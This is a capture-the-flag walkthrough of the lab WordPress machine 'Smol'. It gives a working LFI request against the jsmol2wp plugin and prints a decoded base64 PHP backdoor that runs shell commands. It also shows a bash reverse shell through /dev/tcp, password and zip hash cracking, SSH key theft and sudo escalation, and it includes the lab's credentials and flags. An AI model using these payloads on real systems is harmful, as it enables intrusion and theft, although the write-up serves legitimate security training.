

<hr>
<h2> Question 1: user flag </h2>
Smol is a wordpress website, and i need to get root access in the server!<br>
Lets start with finding the server's open ports:

```
$ nmap 10.10.60.118          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 07:07 EDT
Nmap scan report for smol.thm (10.10.60.118)
Host is up (0.056s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```

Not much, lets check how the wordpress website actually looks like<br>
<img src = "wordpress1.png"><br>
Not much here either, but the tool **wpscan** will tell me more about the website
```
$ wpscan --url http://www.smol.thm
[...]
[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```
<br>

It found a plugin, and after a google search this version of this plugin is vulnerable to LFI<br>
<a href = "https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/"> https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/ </a><br>
Now i can read wp-config.php like this:
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```
The file has some credentials, lets try to login to the admin panel with them(http://www.smol.thm/wp-admin/):
```
/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```

<br>

<img src = "wp-admin1.png"><br>

And it worked!
<br>
And after a little messing around in the wordpress admin panel, the website has a private webmaster tasks page<br>
The page contains a line which says:<br>
```
1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
```
I gotta check hello dolly plugin's source code<br>
luckily it is possible because of the LFI vulnerability found recently<br>
```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```
And there is an interesting line in it:

```
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```
decoding the base64:
```
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```
And decoding this part:
```
\143\155\x64 -> cmd
```
I get:
```
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```
This is an RCE vulnerability i can exploit like this:
```
http://www.smol.thm/wp-admin/index.php?cmd=<command>
```
And making a more stable shell using ncat:
```
ncat -nlvp 8081
```
and pasting this into the browser:
```
http://www.smol.thm/wp-admin/index.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP>%2F8081%200%3E%261
```
And getting the shell:
```
Ncat: Connection from 10.10.60.118:52498.
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-60-118:/var/www/wordpress/wp-admin$ 
```
<br>
And now i have to get the first flag<br>
Checking home directory the server has 4 users<br><br>
after doing some basic PE methods, turns out mysql running on the server<br>
I have the sql login credentials from earlier:

```
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```
Lets try to login with them to the mysql databse:
```
www-data@ip-10-10-36-238:/home$ mysql -u wpuser -p
Enter password: kbLSF2Vop#lw3rjDZ629*Z%G

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 8.0.42-0ubuntu0.20.04.1 (Ubuntu)
[...]
```
And it worked!<br>
Lets go Through the database!
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+

mysql> use wordpress;
show tables; 
+---------------------------+
| Tables_in_wordpress       |
+---------------------------+
| [...]                     |
| wp_users                  |
| [...]                     |
+---------------------------+

select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
```

Here is all the users credentials!
<br>
After trying to crack the password hashes, i was able to only do it with the user diego:
```
$ john hash --wordlist=../wordlist/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (?)     
1g 0:00:00:56 DONE (2025-10-29 08:14) 0.01775g/s 23376p/s 23376c/s 23376C/s sandr1ta..sandervandoorn
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
The password for diego is "sandiegocalifornia"<br>
Lets try to login with this password to diegos account on the linux machine!
```
www-data@ip-10-10-36-238:/var/www/wordpress/wp-admin$ su diego
Password: sandiegocalifornia

diego@ip-10-10-36-238:/var/www/wordpress/wp-admin$ 

```
Good, checking diegos home directory, he has the user flag in it!
```
diego@ip-10-10-36-238:~$ cat user.txt
45edaec653ff9ee06236b7ce72b86963
```
<hr>
<h2> Question 2: Root flag </h2>
To get to root, i probably have to go trough users<br>
Checking the other users home directories, i can read the user "think"s .ssh directory<br>

```
diego@ip-10-10-36-238:/home$ cat think/.ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
[...]
-----END OPENSSH PRIVATE KEY-----
```

Saving the id_rsa file to my kali and connecting to think's account via ssh:
```
ssh -i id_rsa2 think@10.10.36.238
think@ip-10-10-36-238:~$ 
```
Here too, after some linpeas and findings, i tried to login as gege, and it didnt asked for a password:
```
think@ip-10-10-36-238:~$ su gege
gege@ip-10-10-36-238:/home/think$ 
```

<br>
Going through Gege's home directory i found a wordpress.old.zip zip file<br>
When i Tried to unzip it, it asked for a password:

```
gege@ip-10-10-36-238:~$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password:
```

I downloaded the zip file to my kali i was able to crack the zip files password using john:

```
$ zip2john wordpress.old.zip > ziphash2
$ john ziphash2 --wordlist=../wordlist/rockyou.txt
```
And the password is: hero_gege@hotmail.com<br>
Inside the zip file there is a wp-config.php file, which contained the credentials for xavi:

```
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

Logging in:
```
gege@ip-10-10-36-238:~$ su xavi
Password: 
xavi@ip-10-10-36-238:/home/gege$ 
```
And i have shell as xavi! <br>
Lets go higher<br>
I Tried some basic PE methods again, and it looks like xavi can run anything as root:
```
xavi@ip-10-10-36-238:/home/gege$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on ip-10-10-36-238:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-10-36-238:
    (ALL : ALL) ALL
```

Lets try:
```
xavi@ip-10-10-36-238:/home/gege$ sudo /bin/bash
root@ip-10-10-36-238:/home/gege$ 
```
And getting the root flag:
```
root@ip-10-10-36-238:~$ cat root.txt
bf89ea3ea01992353aef1f576214d4e4
```
